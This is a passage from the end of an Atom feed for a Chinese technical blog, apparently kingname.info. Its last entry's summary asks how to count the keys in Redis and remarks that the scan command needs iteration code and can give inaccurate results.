&lt;p&gt;那么，我们应该怎么知道当前有多少个 Key 呢？有同学说可以使用&lt;code&gt;scan&lt;/code&gt;命令。但这个命令一方面是需要写程序来迭代，另一方面是它给出的结果可能是不准确的。&lt;/p&gt;
    
    </summary>
    
      <category term="Redis" scheme="https://www.kingname.info/categories/Redis/"/>
    
    
      <category term="Redis" scheme="https://www.kingname.info/tags/Redis/"/>
    
  </entry>
  
</feed>
